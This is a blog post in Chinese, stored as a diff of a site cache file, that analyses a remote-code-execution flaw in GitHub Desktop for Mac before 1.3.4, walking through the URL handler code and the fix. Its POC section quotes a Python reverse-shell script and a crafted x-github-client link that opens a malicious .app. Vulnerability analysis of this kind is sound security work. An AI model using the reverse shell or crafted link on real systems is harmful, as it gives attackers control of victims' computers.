@@ -1,0 +1,136 @@
+I"�<h1 id="github-desktop-for-mac--134-rce-漏洞分析">Github Desktop for Mac &lt; 1.3.4 RCE 漏洞分析</h1>
+<p class="date">06 Dec 2018 - Tr3jer_CongRong</p>
+
+<p>      白天看到老外在H1-702 2018玩的项目，electron的案例不多，感觉有点意思复现下。</p>
+
+<blockquote>
+  <p>准备工作：</p>
+</blockquote>
+
+<ul>
+  <li>https://github.com/desktop/desktop/archive/release-1.3.3.zip</li>
+  <li>恢复下.git/目录以及所需的文件</li>
+  <li>yarn install</li>
+  <li>yarn build:prod</li>
+  <li>mv dist/GitHub Desktop-darwin-x64/GitHub Desktop.app /Applications</li>
+</ul>
+
+<blockquote>
+  <p>漏洞成因:</p>
+</blockquote>
+
+<p>首先github的<code>Clone or download</code>按钮包含一个<code>Open in Desktop</code>的pull方式</p>
+
+<p>验证时发现目前该方式的协议为<code>github-mac://</code>但早起版本的协议应该是<code>x-github-client://</code>，并且包含几个参数:</p>
+
+<pre><code>x-github-client://openRepo/https://github.com/user/repo?branch=master&amp;filepath=README.md
+</code></pre>
+
+<p>app/src/lib/app-shell.ts</p>
+
+<pre><code>export const shell: IAppShell = {
+	moveItemToTrash: electronShell.moveItemToTrash,
+	beep: electronShell.beep,
+	openExternal: path =&gt; {
+		return new Promise&lt;boolean&gt;((resolve, reject) =&gt; {
+			ipcRenderer.once(
+				'open-external-result',
+				(event: Electron.IpcMessageEvent, { result }: { result: boolean }) =&gt; {
+					resolve(result)
+				}
+			)
+
+			ipcRenderer.send('open-external', { path })
+		})
+	},
+	showItemInFolder: path =&gt; {
+		ipcRenderer.send('show-item-in-folder', { path })
+	},
+	openItem: electronShell.openItem,
+}
+</code></pre>
+
+<p>ipcRenderer对象使用<code>show-item-in-folder</code>事件发送获取到的path</p>
+
+<p>跟进app/src/main-process/main.ts</p>
+
+<pre><code>ipcMain.on(
+	'show-item-in-folder',
+	(event: Electron.IpcMessageEvent, { path }: { path: string }) =&gt; {
+		Fs.stat(path, (err, stats) =&gt; {
+			if (err) {
+				log.error(`Unable to find file at '${path}'`, err)
+				return
+			}
+
+			if (stats.isDirectory()) {
+				openDirectorySafe(path)
+			} else {
+				shell.showItemInFolder(path)
+			}
+		})
+	}
+)
+</code></pre>
+
+<p>ipcMain对象监听到该事件消息后，fs库判断下是否为目录，如果是则传进<code>openDirectorySafe</code>。但没有考虑到mac系统下.app也是为目录的</p>
+
+<pre><code>&gt; fs = require('fs')
+&gt; fs.stat('/Applications/GitHub Desktop.app',(err,stats)=&gt;{console.log(stats.isDirectory())})
+&gt; true
+</code></pre>
+
+<p>跟进app/src/main-process/shell.ts</p>
+
+<pre><code>export function openDirectorySafe(path: string) {
+	if (__DARWIN__) {
+		const directoryURL = Url.format({
+			pathname: path,
+			protocol: 'file:',
+			slashes: true,
+		})
+
+		shell.openExternal(directoryURL)
+	} else {
+		shell.openItem(path)
+	}
+}
+</code></pre>
+
+<p>判断如果是mac系统则使用<code>file://</code>协议重新构造url，并<code>shell.openExternal</code>运行。</p>
+
+<blockquote>
+  <p>POC:</p>
+</blockquote>
+
+<p>作者编写的py版本<a target="_blank" href="https://github.com/0xACB/github-desktop-poc">POC</a>，并用Pyinstaller打包了起来</p>
+
+<pre><code>import socket,subprocess,os;
+
+os.system("open -a calculator.app")
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("localhost",1337));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);
+</code></pre>
+
+<p>本地监听，浏览器打开包含指定POC APP的链接：</p>
+
+<pre><code>x-github-client://openRepo/https://github.com/0xACB/github-desktop-poc?branch=master&amp;filepath=osx/evil-app/rce.app
+</code></pre>
+
+<p>浏览器询问是否使用GitHub Desktop.app打开，确定并开始clone，随后反弹shell。</p>
+
+<blockquote>
+  <p>Fixed:</p>
+</blockquote>
+
+<p>fix方式很简单，判断不是mac系统最终才可以打开</p>
+
+<pre><code>-        if (stats.isDirectory()) {
++        if (!__DARWIN__ &amp;&amp; stats.isDirectory()) {
+</code></pre>
+:ET
